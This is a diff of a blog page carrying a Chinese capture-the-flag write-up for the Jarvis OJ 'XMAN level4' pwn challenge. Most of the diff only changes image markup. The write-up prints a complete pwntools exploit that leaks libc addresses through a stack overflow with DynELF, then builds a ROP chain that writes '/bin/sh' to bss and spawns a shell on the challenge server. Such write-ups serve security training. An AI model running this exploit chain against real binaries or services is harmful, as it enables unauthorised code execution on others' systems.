@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9880 level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0  32位elf，开了Partial RELRO和NX：  静态分析  明显的溢出，没有直接可用的system，libc也未知 我们可以使用pwntools的DynELF模块来泄漏地址信息，具体参考这篇：  【技术分享】借助DynELF实现无libc的漏洞利用">
+    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9880 level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0  32位elf，开了Partial RELRO和NX：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN level4">
 <meta property="og:url" content="https://darkwing.moe/2019/05/20/XMAN-level4/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9880 level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0  32位elf，开了Partial RELRO和NX：  静态分析  明显的溢出，没有直接可用的system，libc也未知 我们可以使用pwntools的DynELF模块来泄漏地址信息，具体参考这篇：  【技术分享】借助DynELF实现无libc的漏洞利用">
+<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9880 level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0  32位elf，开了Partial RELRO和NX：">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052001.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052002.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052003.jpg">
@@ -126,7 +126,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -216,22 +216,71 @@
 <p><a href="https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0" target="_blank" rel="noopener">level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0</a></p>
 </blockquote>
 <p>32位elf，开了Partial RELRO和NX：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052001.jpg" alt=""></p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052002.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052003.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>明显的溢出，没有直接可用的system，libc也未知</p>
 <p>我们可以使用pwntools的DynELF模块来泄漏地址信息，具体参考这篇：</p>
 <ul>
 <li>【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></li>
 </ul>
 <p>同时还有一点，因为文件本身内部没有字符串”/bin/sh”，所以我们要将它写到bss段中一边以后读取，我们在IDA中，可以看到bss段哪里开始是空的</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052004.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052005.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>因为read有三个参数，想要read之后执行system的话需要pop3ret的gadget，使用ROPgadget查找：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052006.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9880</span>)</span><br><span class="line"><span class="comment"># sh = process('./level4')</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">vuln_func = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">pop3ret = <span class="number">0x08048509</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="comment"># write(STDOUT,address,4)</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    payload += p32(write_plt)</span><br><span class="line">    payload += p32(vuln_func)</span><br><span class="line">    payload += p32(<span class="number">1</span>)</span><br><span class="line">    payload += p32(address)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    leak_addr = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(STDIN,bss_addr,8)</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pop3ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># system('/bin/sh')</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052007.jpg" alt=""></p>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052007.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 
         </div>
 
